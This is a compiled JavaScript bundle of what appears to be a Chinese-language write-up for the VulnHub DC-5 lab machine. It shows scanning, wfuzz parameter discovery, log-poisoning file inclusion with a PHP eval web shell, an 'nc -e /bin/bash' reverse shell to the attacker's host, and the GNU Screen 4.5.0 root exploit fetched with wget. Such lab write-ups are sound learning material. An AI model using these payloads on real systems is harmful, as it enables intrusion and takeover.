"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[3834],{28453:(n,e,r)=>{r.d(e,{R:()=>l,x:()=>t});var s=r(96540);const c={},i=s.createContext(c);function l(n){const e=s.useContext(i);return s.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function t(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(c):n.components||c:l(n.components),s.createElement(i.Provider,{value:e},n.children)}},33355:(n,e,r)=>{r.r(e),r.d(e,{assets:()=>d,contentTitle:()=>t,default:()=>h,frontMatter:()=>l,metadata:()=>s,toc:()=>a});const s=JSON.parse('{"id":"VulnHub/Virtual Machines/DC-5","title":"DC-5","description":"DC-5\u6e17\u900f\u6d4b\u8bd5","source":"@site/docs/VulnHub/Virtual Machines/DC-5.md","sourceDirName":"VulnHub/Virtual Machines","slug":"/VulnHub/Virtual Machines/DC-5","permalink":"/docs/VulnHub/Virtual Machines/DC-5","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/VulnHub/Virtual Machines/DC-5.md","tags":[],"version":"current","frontMatter":{},"sidebar":"VulnHubSidebar","previous":{"title":"DC-4","permalink":"/docs/VulnHub/Virtual Machines/DC-4"},"next":{"title":"DC-6","permalink":"/docs/VulnHub/Virtual Machines/DC-6"}}');var c=r(74848),i=r(28453);const l={},t=void 0,d={},a=[{value:"DC-5\u6e17\u900f\u6d4b\u8bd5",id:"dc-5\u6e17\u900f\u6d4b\u8bd5",level:2},{value:"\u4e3b\u673a\u626b\u63cf",id:"\u4e3b\u673a\u626b\u63cf",level:3},{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:3},{value:"\u76ee\u5f55\u626b\u63cf",id:"\u76ee\u5f55\u626b\u63cf",level:3},{value:"\u6f0f\u6d1e\u53d1\u73b0\u548c\u5229\u7528",id:"\u6f0f\u6d1e\u53d1\u73b0\u548c\u5229\u7528",level:3},{value:"\u65e5\u5fd7\u5305\u542b",id:"\u65e5\u5fd7\u5305\u542b",level:4},{value:"\u63d0\u6743",id:"\u63d0\u6743",level:3},{value:"\u603b\u7ed3",id:"\u603b\u7ed3",level:3}];function o(n){const e={a:"a",blockquote:"blockquote",code:"code",h2:"h2",h3:"h3",h4:"h4",img:"img",p:"p",pre:"pre",...(0,i.R)(),...n.components};return(0,c.jsxs)(c.Fragment,{children:[(0,c.jsx)(e.h2,{id:"dc-5\u6e17\u900f\u6d4b\u8bd5",children:"DC-5\u6e17\u900f\u6d4b\u8bd5"}),"\n",(0,c.jsx)(e.h3,{id:"\u4e3b\u673a\u626b\u63cf",children:"\u4e3b\u673a\u626b\u63cf"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-shell",children:"nmap -sn 192.168.56.0/24\r\nNmap scan report for 192.168.56.109\r\nHost is up (0.00038s latency).\r\nMAC Address: 08:00:27:C0:33:AA (Oracle VirtualBox virtual NIC)\n"})}),"\n",(0,c.jsxs)(e.blockquote,{children:["\n",(0,c.jsx)(e.p,{children:"\u9776\u673aip\uff1a192.168.56.109"}),"\n"]}),"\n",(0,c.jsx)(e.h3,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,c.jsx)(e.p,{children:"\u626b\u63cf\u5168\u7aef\u53e3"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-shell",children:"nmap --min-rate 10000 -p- 192.168.56.109\n"})}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-bash",children:"Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 02:26 EDT\r\nStats: 0:00:37 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan\r\nSYN Stealth Scan Timing: About 76.19% done; ETC: 02:27 (0:00:12 remaining)\r\nNmap scan report for 192.168.56.109\r\nHost is up (0.00028s latency).\r\nNot shown: 65532 closed tcp ports (reset)\r\nPORT      STATE SERVICE\r\n80/tcp    open  http\r\n111/tcp   open  rpcbind\r\n59961/tcp open  unknown\r\nMAC Address: 08:00:27:C0:33:AA (Oracle VirtualBox virtual NIC)\r\n\r\nNmap done: 1 IP address (1 host up) scanned in 85.26 seconds\n"})}),"\n",(0,c.jsx)(e.p,{children:'rpcbind\u662fNFS\u4e2d \u7528\u6765\u8fdb\u884c\u6d88\u606f\u901a\u77e5\u7684\u670d\u52a1\u3002\u4e00\u822c\u60c5\u51b5 \u4e0brpcbind\u8fd0\u884c\u5728111\u7aef\u53e3\u3002\u5e76\u4e14NFS\u914d\u7f6e\u5f00 \u542frpcbind_ enable="YES"'}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.a,{href:"https://www.cnblogs.com/lnterpreter/p/15504651.html",children:"rpcbind"})}),"\n",(0,c.jsxs)(e.p,{children:["\u53ef\u4ee5\u641c\u4e00\u4e0brpcbind\u6709\u4ec0\u4e48\u6f0f\u6d1e",(0,c.jsx)(e.code,{children:"searchsploit rpcbind"}),"\uff0c\u6ca1\u6709\u4ec0\u4e48\u53ef\u5229\u7528\u7684\u6f0f\u6d1e"]}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"nmap -p 111 --script=rpcinfo 192.168.56.109\n"})}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-shell",children:"Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 02:33 EDT\r\nNmap scan report for 192.168.56.109\r\nHost is up (0.00047s latency).\r\n\r\nPORT    STATE SERVICE\r\n111/tcp open  rpcbind\r\n| rpcinfo: \r\n|   program version    port/proto  service\r\n|   100000  2,3,4        111/tcp   rpcbind\r\n|   100000  2,3,4        111/udp   rpcbind\r\n|   100000  3,4          111/tcp6  rpcbind\r\n|   100000  3,4          111/udp6  rpcbind\r\n|   100024  1          33709/udp6  status\r\n|   100024  1          36913/tcp6  status\r\n|   100024  1          39562/udp   status\r\n|_  100024  1          59961/tcp   status\r\nMAC Address: 08:00:27:C0:33:AA (Oracle VirtualBox virtual NIC)\r\n\r\nNmap done: 1 IP address (1 host up) scanned in 0.29 seconds\n"})}),"\n",(0,c.jsx)(e.h3,{id:"\u76ee\u5f55\u626b\u63cf",children:"\u76ee\u5f55\u626b\u63cf"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-shell",children:"dirsearch -u http://192.168.56.109\n"})}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-shell",children:"Target: http://192.168.56.109/\r\n\r\n[02:28:05] Starting: \r\n[02:28:23] 200 -    4KB - /contact.php\r\n[02:28:24] 301 -  184B  - /css  ->  http://192.168.56.109/css/\r\n[02:28:27] 200 -    6KB - /faq.php\r\n[02:28:28] 200 -   17B  - /footer.php\r\n[02:28:30] 403 -  570B  - /images/\r\n[02:28:30] 301 -  184B  - /images  ->  http://192.168.56.109/images/\r\n[02:28:47] 200 -  852B  - /thankyou.php\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u63a5\u7740\u770bweb\u9875\u9762"}),"\n",(0,c.jsx)(e.h3,{id:"\u6f0f\u6d1e\u53d1\u73b0\u548c\u5229\u7528",children:"\u6f0f\u6d1e\u53d1\u73b0\u548c\u5229\u7528"}),"\n",(0,c.jsx)(e.p,{children:"\u89c2\u5bdf\u9875\u811a\uff0c\u6bcf\u6b21\u5237\u65b0\u4ed6\u90fd\u4f1a\u53d8"}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240312143700257.png",alt:"image-20240312143700257"})}),"\n",(0,c.jsx)(e.p,{children:"\u6839\u636e\u6211\u4eec\u626b\u5230\u7684footer.php\uff0c\u8fd9\u91cc\u53ef\u80fd\u5305\u542b\u4e86footer.php"}),"\n",(0,c.jsx)(e.p,{children:"wfuzz\u679a\u4e3e\u4e00\u4e0b\u53c2\u6570"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"wfuzz -z file,/usr/share/wfuzz/wordlist/general/common.txt 192.168.56.109/thankyou.php?FUZZ=/etc/passwd\n"})}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:'000000343:   200        42 L     66 W       851 Ch      "filter"\r\n000000342:   200        42 L     66 W       851 Ch      "files"\r\n000000341:   200        70 L     104 W      2319 Ch     "file"\r\n000000337:   200        42 L     66 W       851 Ch      "failed"\n'})}),"\n",(0,c.jsx)(e.p,{children:"\u53c2\u6570\u5c31\u662ffile"}),"\n",(0,c.jsx)(e.p,{children:"\u8fd9\u91cc\u4f7f\u7528\u7684\u662fnginx\u670d\u52a1\uff0c\u53ef\u4ee5\u5229\u7528\u65e5\u5fd7\u5305\u542b"}),"\n",(0,c.jsx)(e.h4,{id:"\u65e5\u5fd7\u5305\u542b",children:"\u65e5\u5fd7\u5305\u542b"}),"\n",(0,c.jsxs)(e.p,{children:["nginx\u7684\u9ed8\u8ba4\u65e5\u5fd7\u5728",(0,c.jsx)(e.code,{children:"/var/log/nginx/access.log"}),"\u4e2d\uff0c\u9519\u8bef\u65e5\u5fd7\u5728",(0,c.jsx)(e.code,{children:"/var/log/nginx/error.log"}),"\u4e2d"]}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"http://192.168.56.109/thankyou.php?file=<?php @eval($_POST[1]);?>\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u5199\u8fdb\u53bb\u4e00\u53e5\u8bdd\u6728\u9a6c\uff0c\u76f4\u63a5\u8681\u5251\u8fde\u63a5\u4e86"}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240312145830178.png",alt:"image-20240312145830178"})}),"\n",(0,c.jsx)(e.p,{children:"\u63a5\u7740\u5f39\u4e00\u4e2ashell\u5230kali"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"nc -e /bin/bash 192.168.56.101 1234\n"})}),"\n",(0,c.jsx)(e.h3,{id:"\u63d0\u6743",children:"\u63d0\u6743"}),"\n",(0,c.jsx)(e.p,{children:"\u9996\u5148\u67e5\u770b\u4e00\u4e0b\u6709suid\u6743\u9650\u7684\u6587\u4ef6"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-bash",children:"www-data@dc-5:~$ find / -type f -perm -4000 2>/dev/null\r\nfind / -type f -perm -4000 2>/dev/null\r\n/bin/su\r\n/bin/mount\r\n/bin/umount\r\n/bin/screen-4.5.0\r\n/usr/bin/gpasswd\r\n/usr/bin/procmail\r\n/usr/bin/at\r\n/usr/bin/passwd\r\n/usr/bin/chfn\r\n/usr/bin/newgrp\r\n/usr/bin/chsh\r\n/usr/lib/openssh/ssh-keysign\r\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\r\n/usr/lib/eject/dmcrypt-get-device\r\n/usr/sbin/exim4\r\n/sbin/mount.nfs\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u8fd9\u91cc\u6211\u7b2c\u4e00\u773c\u5c31\u770b\u5230\u4e86/bin/screen-4.5.0\uff0c\u5c31\u76f4\u63a5\u627e\u5b83\u7684\u6f0f\u6d1e"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"searchsploit screen\n"})}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"GNU Screen 4.5.0 - Local Privilege Escalation    linux/local/41154.sh\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u8fd8\u771f\u8ba9\u6211\u627e\u5bf9\u4e86\uff0c\u672c\u5730\u63d0\u6743\u8d70\u8d77"}),"\n",(0,c.jsx)(e.p,{children:"\u590d\u5236\u5230\u5f53\u524d\u76ee\u5f55\u4e0b"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"cp /usr/share/exploitdb/exploits/linux/local/41154.sh dc-5.sh\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u4e0b\u8f7d\u5230\u9776\u673a\u4e0a"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-shell",children:"www-data@dc-5:/tmp$ wget http://192.168.56.101/dc-5.sh\r\nwget http://192.168.56.101/dc-5.sh\r\nconverted 'http://192.168.56.101/dc-5.sh' (ANSI_X3.4-1968) -> 'http://192.168.56.101/dc-5.sh' (UTF-8)\r\n--2024-03-12 17:09:29--  http://192.168.56.101/dc-5.sh\r\nConnecting to 192.168.56.101:80... connected.\r\nHTTP request sent, awaiting response... 200 OK\r\nLength: 1149 (1.1K) [text/x-sh]\r\nSaving to: 'dc-5.sh'\r\n\r\ndc-5.sh             100%[=====================>]   1.12K  --.-KB/s   in 0s     \r\n\r\n2024-03-12 17:09:29 (317 MB/s) - 'dc-5.sh' saved [1149/1149]\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u76f4\u63a5\u6267\u884c"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"bash dc-5.sh\n"})}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-shell",children:"www-data@dc-5:/tmp$ bash dc-5.sh\r\nbash dc-5.sh\r\n~ gnu/screenroot ~\r\n[+] First, we create our shell and library...\r\n[+] Now we create our /etc/ld.so.preload file...\r\n[+] Triggering...\r\n' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.\r\n[+] done!\r\nNo Sockets found in /tmp/screens/S-www-data.\r\n\r\n# id\r\nid\r\nuid=0(root) gid=0(root) groups=0(root),33(www-data)\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u62ff\u5230root\u7684\u6743\u9650"}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240312151248203.png",alt:"image-20240312151248203"})}),"\n",(0,c.jsx)(e.h3,{id:"\u603b\u7ed3",children:"\u603b\u7ed3"}),"\n",(0,c.jsxs)(e.blockquote,{children:["\n",(0,c.jsx)(e.p,{children:"wfuzz\u7684\u5229\u7528"}),"\n",(0,c.jsxs)(e.p,{children:["nginx\u7684\u65e5\u5fd7\u9ed8\u8ba4\u8def\u5f84\u5728\u54ea\uff1f\r\n",(0,c.jsx)(e.code,{children:"\u8bbf\u95ee\u65e5\u5fd7\uff1a/usr/local/nginx/logs/access.log"})," \u6216\u8005 ",(0,c.jsx)(e.code,{children:"/var/log/nginx/access.log"}),"\r\n",(0,c.jsx)(e.code,{children:"\u9519\u8bef\u65e5\u5fd7\uff1a/usr/loacl/nginx/logs/error.log"})," \u6216\u8005",(0,c.jsx)(e.code,{children:"/var/log/nginx/error.log"})]}),"\n",(0,c.jsx)(e.p,{children:"\u9776\u673a\u6d89\u53ca\u7684\u77e5\u8bc6\u70b9\uff1a"}),"\n",(0,c.jsx)(e.p,{children:"\u6587\u4ef6\u5305\u542b\uff0c\u65e5\u5fd7\u5305\u542b\uff0cwfuzz\u53c2\u6570\u7684\u679a\u4e3e\uff0cscreen\u63d0\u6743"}),"\n"]})]})}function h(n={}){const{wrapper:e}={...(0,i.R)(),...n.components};return e?(0,c.jsx)(e,{...n,children:(0,c.jsx)(o,{...n})}):o(n)}}}]);